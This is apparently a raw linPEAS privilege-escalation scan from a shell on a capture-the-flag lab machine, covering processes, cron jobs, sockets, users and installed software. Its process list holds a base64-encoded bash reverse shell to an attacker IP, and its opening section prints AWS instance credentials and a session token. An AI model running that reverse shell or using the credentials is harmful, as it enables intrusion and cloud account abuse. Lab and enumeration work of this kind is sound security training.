--==BOUNDARY==--

══╣ EC2 Security Credentials
{                                                                                           
  "Code" : "Success",
  "LastUpdated" : "2025-10-22T10:23:20Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQMTKWXIFJD",
  "SecretAccessKey" : "sjbKNxKqVNiNWToO1tccROkyedWNAGMaxBsdNdwL",
  "Token" : "IQoJb3JpZ2luX2VjEHMaCWV1LXdlc3QtMSJHMEUCIBSXhqOXXTnz8Rt76PeTEG97NTzJ+hADW5ja5d9yBO8dAiEApSYg0avOn7rRKIvBRAaHgwzXQRScuJUZk5exhnp12ugqxgQILBADGgw3Mzk5MzA0Mjg0NDEiDALPOFss2QKIjWXfCCqjBMpgUOcv+ZKB39d1L/BJFAOpoReLdVvEH/q+5ShNt581lA6d+C6/sinKGkWjqF2AN+wVQItEYrUBEnb2TNCFCTXuBLm6ivcZUh6eWRv0rRN8rmUcc+S0oBgkXe+R1F086PYUlj2bJJlhxV4pZ9ATaEdFS9Evf0qXAbGKzX4GxZHq7Fc9Ve0zajWvR40+iIDfr6KlU8+ByF91gBVJj15WP5HiEPkKRj44gv/uSsKR8GKkt7CWU0WksYxIoStT7+1wHnZxxEyPypb6DsoMJA3w5/5CmerelA8Hno5bdYb1XEGc6TsWYRhCBjouak1PXPCERU3wjB6cGB3610Ct1AryDh90lKFe79fVSP1ZLT9JopIzNen1KAUHvt7z64OWH9MKMaTIxgvOjS/AZjb/GzM9ApUxx6WLFV3t9K+jMIUbuB+7OlFQJk7OggzWaCdp0xrevsJt+heoV3HbWurzo/FOhxwHYM5zSchIBVdaBHTddMSxj2lrkQ1du0TXOYbVZRok+1VyV1QjEXYUYBYa5yaXbfqQZc4mkLWuSaxv9Jhlf76uwzuV13kLfdreT98zx3X3H9NXQODeg1QLxlEYij8qVb/M3NEJrdVex736mp8O8Fm2AMIin2a8/gZVqMUKzvbkx3xXgTdZFHqD3NiMgKASJHGqh3gDmm4nfcKMuXDEGyL9c2XmDAeg8AEAbDO6GOP6iOS8+RK15wjgJkaa7HipHAEWT2kwgeHixwY6kwLbKsQhs3ROnDWH1t+E25HRCcW1207TxGJ91gbMRnHlBGpNdR4CQ9shTnIfp32pEBM/Iw63tthAp8dY3w9rMTdUfM+dPeZyeE75ycmyqRSOsj/X+kpZB1N/3TqbhF6vSfXTKIJ9C1GNCmEN9WcbAxY5+eNyn9gHpaacMq3xFiK7sCSlTQodfFosMinkyuLtU0MjlkJr4xUqWN9qRktQgd1PYyZ5qe3VaRfic3ApNF8O2simujkOEQoFtKxxFmevt/fDCfn6rfNQH/rZLIuLSq48WWsoCrzSqvwliht+fBSGsteSZFx/7yROWmB3GFszTYfjNg7oSNH33I/raeW/EWh0dtsfuRThMWHsL+RmQCR44LeCHQ==",
  "Expiration" : "2025-10-22T16:25:55Z"
}
══╣ SSM Runnig
root       420  0.0  2.7 876028 26972 ?        Ssl  15:53   0:00 /usr/bin/amazon-ssm-agent  



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════          
                ╚════════════════════════════════════════════════╝                          
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                             
root         1  0.1  0.8 159468  8732 ?        Ss   15:53   0:01 /sbin/init splash          
root       231  0.0  1.4  94828 14092 ?        S<s  15:53   0:00 /lib/systemd/systemd-journald
root       255  0.0  0.5  46040  4952 ?        Ss   15:53   0:00 /lib/systemd/systemd-udevd
systemd+   302  0.0  0.5  80092  5364 ?        Ss   15:53   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw                                                                                          
systemd+   411  0.0  0.3 141964  3400 ?        Ssl  15:53   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   413  0.0  0.5  70672  5376 ?        Ss   15:53   0:00 /lib/systemd/systemd-resolved
root       417  0.0  0.3  35704  3700 ?        Ss   15:53   0:00 /usr/sbin/cron -f
root       418  0.0  0.5  62168  5880 ?        Ss   15:53   0:00 /lib/systemd/systemd-logind
message+   419  0.0  0.4  50044  4408 ?        Ss   15:53   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root       420  0.0  2.7 876028 26972 ?        Ssl  15:53   0:00 /usr/bin/amazon-ssm-agent
root       421  0.0  1.7 170488 16980 ?        Ssl  15:53   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
syslog     422  0.0  0.4 263044  4484 ?        Ssl  15:53   0:00 /usr/sbin/rsyslogd -n
root       423  0.0  0.2 110424  2108 ?        Ssl  15:53   0:00 /usr/sbin/irqbalance --foreground
root       425  0.0  0.7 289848  7280 ?        Ssl  15:53   0:00 /usr/lib/accountsservice/accounts-daemon[0m
root       442  0.0  2.0 187232 20272 ?        Ssl  15:53   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       471  0.0  0.2  15964  2384 ttyS0    Ss+  15:53   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root       475  0.0  0.1  16188  1932 tty1     Ss+  15:53   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root       483  0.0  0.5  72308  5592 ?        Ss   15:53   0:00 /usr/sbin/sshd -D
root       499  0.0  1.7 331424 16892 ?        Ss   15:53   0:00 /usr/sbin/apache2 -k start
www-data   504  0.0  1.0 335872 10272 ?        S    15:53   0:00  _ /usr/sbin/apache2 -k start
www-data   505  0.0  0.9 335824  9200 ?        S    15:53   0:00  _ /usr/sbin/apache2 -k start
www-data   506  0.0  0.9 335824  9200 ?        S    15:53   0:00  _ /usr/sbin/apache2 -k start
www-data   507  0.0  1.4 336044 14424 ?        S    15:53   0:00  _ /usr/sbin/apache2 -k start
www-data   586  0.0  0.0   4636   864 ?        S    15:54   0:00  |   _ sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xNDcuNjUvOTAwMSAwPiYx | base64 -d | bash
www-data   589  0.0  0.3  18384  3140 ?        S    15:54   0:00  |       _ bash
www-data   590  0.0  0.3  18516  3340 ?        S    15:54   0:00  |           _ bash -i
www-data   927  0.5  0.2   5452  2684 ?        S    16:04   0:00  |               _ /bin/sh ./linpeas.sh
www-data  4166  0.0  0.1   5452  1024 ?        S    16:04   0:00  |                   _ /bin/sh ./linpeas.sh
www-data  4168  0.0  0.3  36848  3292 ?        R    16:04   0:00  |                   |   _ ps fauxwww
www-data  4170  0.0  0.1   5452  1024 ?        S    16:04   0:00  |                   _ /bin/sh ./linpeas.sh
www-data   508  0.0  0.9 335824  9200 ?        S    15:53   0:00  _ /usr/sbin/apache2 -k start
www-data   593  0.0  0.9 335824  9200 ?        S    15:54   0:00  _ /usr/sbin/apache2 -k start

╔══════════╣ Processes with unusual configurations
                                                                                            
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                                                       
gdm-password Not Found                                                                      
gnome-keyring-daemon Not Found                                                              
lightdm Not Found                                                                           
vsftpd Not Found                                                                            
apache2 process found (dump creds from memory as root)                                      
sshd: Not Found
mysql Not Found                                                                             
postgres Not Found                                                                          
redis-server Not Found                                                                      
mongod Not Found                                                                            
memcached Not Found                                                                         
elasticsearch Not Found                                                                     
jenkins Not Found                                                                           
tomcat Not Found                                                                            
nginx Not Found                                                                             
php-fpm Not Found                                                                           
supervisord Not Found                                                                       
vncserver Not Found                                                                         
xrdp Not Found                                                                              
teamviewer Not Found                                                                        
                                                                                            
╔══════════╣ Opened Files by processes
Process 586 (www-data) - sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS4xNDcuNjUvOTAwMSAwPiYx | base64 -d | bash 
  └─ Has open files:
    └─ pipe:[17856]
    └─ /var/log/apache2/error.log
Process 589 (www-data) - bash 
  └─ Has open files:
    └─ pipe:[17858]
    └─ pipe:[17856]
    └─ /var/log/apache2/error.log

╔══════════╣ Processes with memory-mapped credential files
                                                                                            
╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                   
                                                                                            
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                      
                                                                                            
╔══════════╣ Check for vulnerable cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                    
══╣ Cron jobs list                                                                          
/usr/bin/crontab                                                                            
incrontab Not Found
-rw-r--r-- 1 root root     767 Nov 20  2020 /etc/crontab                                    

/etc/cron.d:
total 24
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--  1 root root  607 Jun  3  2013 john
-rw-r--r--  1 root root  712 Jan 18  2018 php
-rw-r--r--  1 root root  190 Nov 16  2020 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x  1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x  1 root root 1176 Nov  3  2017 dpkg
-rwxr-xr-x  1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x  1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x  1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x  1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x  1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x  1 root root  246 Mar 21  2018 ubuntu-advantage-tools

/etc/cron.hourly:
total 12
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x  2 root root 4096 Nov 16  2020 .
drwxr-xr-x 81 root root 4096 Oct 22 15:55 ..
-rw-r--r--  1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x  1 root root  723 Apr  7  2018 man-db

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

══╣ Checking for specific cron jobs vulnerabilities
Checking cron directories...                                                                

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers    
══╣ Active timers:                                                                          
NEXT                         LEFT          LAST                         PASSED    UNIT                         ACTIVATES
Wed 2025-10-22 16:08:08 IST  3min 37s left n/a                          n/a       systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service                                           
Wed 2025-10-22 16:09:00 IST  4min 28s left Wed 2025-10-22 15:53:21 IST  11min ago phpsessionclean.timer        phpsessionclean.service                                                  
Wed 2025-10-22 16:18:45 IST  14min left    Wed 2025-10-22 15:53:21 IST  11min ago motd-news.timer              motd-news.service                                                        
Wed 2025-10-22 23:13:51 IST  7h left       Wed 2025-10-22 15:53:21 IST  11min ago apt-daily.timer              apt-daily.service                                                        
Thu 2025-10-23 06:56:47 IST  14h left      Wed 2025-10-22 15:53:21 IST  11min ago apt-daily-upgrade.timer      apt-daily-upgrade.service                                                
Mon 2025-10-27 00:00:00 IST  4 days left   Wed 2025-10-22 15:53:21 IST  11min ago fstrim.timer                 fstrim.service                                                           
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service                                                  
══╣ Disabled timers:
══╣ Additional timer files:                                                                 
                                                                                            
╔══════════╣ Services and Service Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services  
                                                                                            
══╣ Active services:
accounts-daemon.service            loaded active running Accounts Service                                                  
amazon-ssm-agent.service           loaded active running amazon-ssm-agent                                                  
apache2.service                    loaded active running The Apache HTTP Server                                            
./linpeas.sh: 3944: local: /usr/sbin/apachectl: bad variable name
 Not Found
                                                                                            
══╣ Disabled services:
apache-htcacheclean.service  disabled                                                       
apache-htcacheclean@.service disabled
apache2@.service             disabled
console-getty.service        disabled
debug-shell.service          disabled
5 unit files listed.

══╣ Additional service files:
./linpeas.sh: 3944: local: /usr/sbin/apachectl: bad variable name                           
You can't write on systemd PATH

╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                         
═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? .....   
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)                                                               
networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)                                     
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n)

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                                         
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                           

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets   
./linpeas.sh: 4207: local: /run/systemd/journal/socket: bad variable name                   

╔══════════╣ Unix Sockets Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets   
/run/dbus/system_bus_socket                                                                 
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/stdout
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/journal/syslog
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/run/systemd/notify
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/systemd/private
  └─(Read Write Execute (Weak Permissions: 777) )
  └─(Owned by root)
/run/udev/control
/run/uuidd/request
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
/var/run/dbus/system_bus_socket
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)

╔══════════╣ D-Bus Analysis
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus     
NAME                               PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION        
:1.0                               302 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 1 systemd         root             :1.1          init.scope                -          -                  
:1.189                           12747 busctl          www-data         :1.189        apache2.service           -          -                                                            
:1.27                              442 unattended-upgr root             :1.27         unattended-upgrades.se…ce -          -                  
:1.28                              421 networkd-dispat root             :1.28         networkd-dispatcher.se…ce -          -                  
:1.3                               413 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service  -          -                  
:1.4                               418 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
:1.6                               425 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
com.ubuntu.LanguageSelector          - -               -                (activatable) -                         -         
io.netplan.Netplan                   - -               -                (activatable) -                         -         
org.freedesktop.Accounts           425 accounts-daemon[0m root             :1.6          accounts-daemon.service   -          -                  
org.freedesktop.DBus                 1 systemd         root             -             init.scope                -          -                  
org.freedesktop.hostname1            - -               -                (activatable) -                         -         
org.freedesktop.locale1              - -               -                (activatable) -                         -         
org.freedesktop.login1             418 systemd-logind  root             :1.4          systemd-logind.service    -          -                  
org.freedesktop.network1           302 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1           413 systemd-resolve systemd-resolve  :1.3          systemd-resolved.service  -          -                  
org.freedesktop.systemd1             1 systemd         root             :1.1          init.scope                -          -                  
org.freedesktop.timedate1            - -               -                (activatable) -                         -         

╔══════════╣ D-Bus Configuration Files
Analyzing /etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf:                            
  └─(Allow rules in default context)
             └─                 <allow send_interface="com.ubuntu.LanguageSelector"/>
                        <allow receive_interface="com.ubuntu.LanguageSelector"
                        <allow send_destination="com.ubuntu.LanguageSelector"
Analyzing /etc/dbus-1/system.d/org.freedesktop.Accounts.conf:
  └─(Allow rules in default context)
             └─     <allow send_destination="org.freedesktop.Accounts"/>
            <allow send_destination="org.freedesktop.Accounts"
            <allow send_destination="org.freedesktop.Accounts"

══╣ D-Bus Session Bus Analysis
(Access to session bus available)                                                           


╔══════════╣ Legacy r-commands (rsh/rlogin/rexec) and host-based trust
                                                                                            
══╣ Listening r-services (TCP 512-514)
                                                                                            
══╣ systemd units exposing r-services
rlogin|rsh|rexec units Not Found                                                            
                                                                                            
══╣ inetd/xinetd configuration for r-services
/etc/inetd.conf Not Found                                                                   
/etc/xinetd.d Not Found                                                                     
                                                                                            
══╣ Installed r-service server packages
  No related packages found via dpkg                                                        

══╣ /etc/hosts.equiv and /etc/shosts.equiv
                                                                                            
══╣ Per-user .rhosts files
.rhosts Not Found                                                                           
                                                                                            
══╣ PAM rhosts authentication
/etc/pam.d/rlogin|rsh Not Found                                                             
                                                                                            
══╣ SSH HostbasedAuthentication
  HostbasedAuthentication no or not set                                                     

══╣ Potential DNS control indicators (local)
  Not detected                                                                              

╔══════════╣ Crontab UI (root) misconfiguration checks
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                                                    
crontab-ui Not Found                                                                        
                                                                                            

                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════         
                              ╚═════════════════════╝                                       
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                         
link-local 169.254.0.0
ens5: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.112.98  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::f4:49ff:fe8e:8c7  prefixlen 64  scopeid 0x20<link>
        ether 02:f4:49:8e:08:c7  txqueuelen 1000  (Ethernet)
        RX packets 1179  bytes 1071767 (1.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 890  bytes 165093 (165.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 96  bytes 8452 (8.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 96  bytes 8452 (8.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Hostname, hosts and DNS
══╣ Hostname Information                                                                    
System hostname: ubuntu                                                                     
FQDN: ubuntu

══╣ Hosts File Information
Contents of /etc/hosts:                                                                     
  127.0.0.1     localhost development.mafialive.thm
  127.0.1.1     ubuntu
  192.168.43.128        home
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

══╣ DNS Configuration
DNS Servers (resolv.conf):                                                                  
  127.0.0.53
  search eu-west-1.compute.internal
-e 
Systemd-resolved configuration:
  [Resolve]
-e 
DNS Domain Information:
(none)
-e 
DNS Cache Status (systemd-resolve):
  DNS Servers: 10.0.0.2
  DNS Domain: eu-west-1.compute.internal

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)                                                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Network Traffic Analysis Capabilities
                                                                                            
══╣ Available Sniffing Tools
tcpdump is available                                                                        

══╣ Network Interfaces Sniffing Capabilities
Interface ens5: Not sniffable                                                               
No sniffable interfaces found

╔══════════╣ Firewall Rules Analysis
                                                                                            
══╣ Iptables Rules
No permission to list iptables rules                                                        

══╣ Nftables Rules
nftables Not Found                                                                          
                                                                                            
══╣ Firewalld Rules
firewalld Not Found                                                                         
                                                                                            
══╣ UFW Rules
UFW is not running                                                                          

╔══════════╣ Inetd/Xinetd Services Analysis
                                                                                            
══╣ Inetd Services
inetd Not Found                                                                             
                                                                                            
══╣ Xinetd Services
xinetd Not Found                                                                            
                                                                                            
══╣ Running Inetd/Xinetd Services
Active Services (from netstat):                                                             
-e 
Active Services (from ss):
-e 
Running Service Processes:

╔══════════╣ Internet Access?
DNS is not accessible                                                                       
ICMP is not accessible
Port 443 is not accessible
Port 80 is not accessible
ICMP is not accessible
Port 443 is not accessible with wget



                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════         
                               ╚═══════════════════╝                                        
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users     
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                       

╔══════════╣ PGP Keys and Related Files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#pgp-keys  
GPG:                                                                                        
gpg Not Found
-e                                                                                          
NetPGP:
netpgpkeys Not Found
-e                                                                                          
PGP Related Files:

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
                                                                                            

╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                   
ptrace protection is enabled (1)                                                            

doas.conf Not Found
                                                                                            
╔══════════╣ Checking Pkexec and Polkit
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                             
                                                                                            
══╣ Polkit Binary
                                                                                            
══╣ Polkit Policies
Checking /usr/share/polkit-1/rules.d/:                                                      
// Allow systemd-networkd to set timezone and transient hostname
polkit.addRule(function(action, subject) {
    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
         action.id == "org.freedesktop.timedate1.set-timezone") &&
        subject.user == "systemd-network") {
        return polkit.Result.YES;
    }
});

══╣ Polkit Authentication Agent
                                                                                            
╔══════════╣ Superusers and UID 0 Users
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                                           
                                                                                            
══╣ Users with UID 0 in /etc/passwd
root:x:0:0:root:/root:/bin/bash                                                             

══╣ Users with sudo privileges in sudoers
                                                                                            
╔══════════╣ Users with console
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash                                
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=109(uuidd) groups=109(uuidd)
uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Currently Logged in Users
                                                                                            
══╣ Basic user information
 16:05:17 up 12 min,  0 users,  load average: 0.17, 0.12, 0.09                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Active sessions
 16:05:17 up 12 min,  0 users,  load average: 0.17, 0.12, 0.09                              
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

══╣ Logged in users (utmp)
           system boot  Oct 22 15:53                                                        
           run-level 5  Oct 22 15:53
LOGIN      ttyS0        Oct 22 15:53               471 id=tyS0
LOGIN      tty1         Oct 22 15:53               475 id=tty1

══╣ SSH sessions
                                                                                            
══╣ Screen sessions
                                                                                            
══╣ Tmux sessions
                                                                                            
╔══════════╣ Last Logons and Login History
                                                                                            
══╣ Last logins
reboot   system boot  4.15.0-123-gener Wed Oct 22 15:53   still running                     
reboot   system boot  4.15.0-123-gener Fri Nov 20 17:07 - 17:10  (00:02)
archange tty1                          Fri Nov 20 15:21 - crash  (01:45)
reboot   system boot  4.15.0-123-gener Fri Nov 20 15:21 - 17:10  (01:48)
reboot   system boot  4.15.0-123-gener Fri Nov 20 15:06 - 17:10  (02:03)
archange pts/0        192.168.43.128   Fri Nov 20 14:48 - 15:03  (00:15)
archange tty1                          Fri Nov 20 14:44 - crash  (00:22)
reboot   system boot  4.15.0-123-gener Fri Nov 20 14:44 - 17:10  (02:26)
archange pts/0        192.168.43.128   Fri Nov 20 10:38 - crash  (04:05)
archange pts/0        192.168.43.128   Fri Nov 20 10:33 - 10:38  (00:04)
archange tty1                          Fri Nov 20 10:31 - crash  (04:12)
reboot   system boot  4.15.0-123-gener Fri Nov 20 10:30 - 17:10  (06:39)
archange tty1                          Thu Nov 19 21:28 - crash  (13:01)
reboot   system boot  4.15.0-123-gener Thu Nov 19 21:28 - 17:10  (19:41)
archange tty1                          Thu Nov 19 21:25 - crash  (00:02)
reboot   system boot  4.15.0-123-gener Thu Nov 19 21:24 - 17:10  (19:45)
root     tty1                          Thu Nov 19 20:41 - crash  (00:43)
reboot   system boot  4.15.0-123-gener Thu Nov 19 20:40 - 17:10  (20:29)
archange pts/0        192.168.43.128   Thu Nov 19 18:13 - crash  (02:26)
reboot   system boot  4.15.0-123-gener Thu Nov 19 18:12 - 17:10  (22:57)

wtmp begins Mon Nov 16 16:14:22 2020

══╣ Failed login attempts
                                                                                            
══╣ Recent logins from auth.log (limit 20)
                                                                                            
══╣ Last time logon each user
Username         Port     From             Latest                                           
root             tty1                      Thu Nov 19 20:41:18 +0530 2020
archangel        tty1                      Fri Nov 20 15:21:35 +0530 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                 
                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!                                                                              
                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════          
                             ╚══════════════════════╝                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                             
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
/usr/share/gcc-8                                                                            

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.29 (Ubuntu)                                      
Server built:   2020-08-12T21:33:25
httpd Not Found
                                                                                            
Nginx version: nginx Not Found
                                                                                            
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php7.2.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.ph(ar|p|tml)$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php7.2.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php7.2.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Nov 16  2020 /etc/apache2/sites-enabled                         
drwxr-xr-x 2 root root 4096 Nov 16  2020 /etc/apache2/sites-enabled
